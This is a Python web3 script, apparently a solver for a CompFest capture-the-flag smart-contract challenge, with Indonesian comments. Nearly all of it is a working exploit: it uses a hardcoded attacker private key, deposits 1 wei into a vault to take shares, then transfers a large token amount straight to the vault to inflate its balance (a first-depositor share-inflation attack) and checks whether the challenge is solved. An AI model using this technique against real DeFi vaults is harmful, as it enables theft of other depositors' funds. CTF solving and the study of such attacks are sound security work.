from web3 import Web3
import json

RPC_URL = "http://ctf.compfest.id:7401/e4c53161-3565-4b30-bc8b-8cd24f82a5ad"
ATTACKER_PRIVATE_KEY = "f3988499fd7ac9e273bbdb180685a1cd96b74b142dc1df73c7055f552bd6f30f"
SETUP_CONTRACT_ADDRESS = "0xB2838D80b2bc8D9E7284d7B6bE2bc194Ff4e574A"
WALLET_ADDR = "0x7734785884951636907fB4677D5CB12B14Ab61cb"

try:
    with open('Fortress.json') as f:
        FORTRESS_ABI = json.load(f)
    with open('PhantomCoin.json') as f:
        PHTM_ABI = json.load(f)
    with open('Vault.json') as f:
        VAULT_ABI = json.load(f)
    with open('Setup.json') as f:
        SETUP_ABI = json.load(f)
except FileNotFoundError:
    print("Error: Pastikan file ABI (.json) ada di folder yang sama dengan skrip ini.")
    exit()
except json.JSONDecodeError:
    print("Error: Ada masalah saat membaca file JSON. Pastikan isinya valid.")
    exit()
# --- AKHIR KONFIGURASI ---


# 1. Koneksi ke Blockchain
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("Gagal terhubung ke node blockchain!")
    exit()

attacker_account = w3.eth.account.from_key(ATTACKER_PRIVATE_KEY)
w3.eth.default_account = attacker_account.address
print(f"Berhasil terhubung. Alamat Attacker: {attacker_account.address}")

setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDRESS, abi=SETUP_ABI)

challenge_address = setup_contract.functions.challenge().call()
challenge_contract = w3.eth.contract(address=challenge_address, abi=FORTRESS_ABI)

token_address = challenge_contract.functions.token().call()
token_contract = w3.eth.contract(address=token_address, abi=PHTM_ABI)

vault_address = challenge_contract.functions.vault().call()
vault_contract = w3.eth.contract(address=vault_address, abi=VAULT_ABI)

print(f"Alamat kontrak Fortress: {challenge_address}")
print(f"Alamat kontrak Token: {token_address}")
print(f"Alamat kontrak Vault: {vault_address}")

def send_tx(tx):
    tx['chainId'] = w3.eth.chain_id
    tx['gas'] = w3.eth.estimate_gas(tx)
    tx['maxFeePerGas'] = w3.eth.gas_price * 2 
    tx['maxPriorityFeePerGas'] = w3.to_wei(1, 'gwei')

    signed_tx = w3.eth.account.sign_transaction(tx, ATTACKER_PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction) 
    
    print(f"Mengirim transaksi, hash: {tx_hash.hex()}. Menunggu konfirmasi...")
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    print("Transaksi berhasil!")
    return tx_receipt

print("\n--- Memulai Eksploitasi ---")

print("\n[LANGKAH 1] Melakukan deposit awal sebesar 1 wei...")
tx_buy_initial = token_contract.functions.buyTokens().build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
    'value': 1 
})
send_tx(tx_buy_initial)

tx_approve = token_contract.functions.approve(vault_address, 1).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_approve)

tx_deposit = vault_contract.functions.deposit(1).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_deposit)
print("Deposit awal berhasil. Total shares sekarang > 0.")

print("\n[LANGKAH 2 & 3] Membeli banyak token dan mentransfer langsung ke Vault...")
attack_amount = w3.to_wei(0.5, 'ether')

tx_buy_attack = token_contract.functions.buyTokens().build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
    'value': attack_amount
})
send_tx(tx_buy_attack)

tx_inflate = token_contract.functions.transfer(vault_address, attack_amount).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_inflate)
print("Balance vault berhasil diinflasi!")

is_solved = setup_contract.functions.isSolved().call()

if is_solved:
    print("\n✅ SELAMAT! Tantangan berhasil diselesaikan!")
else:
    print("\n❌ GAGAL! Tantangan belum selesai.")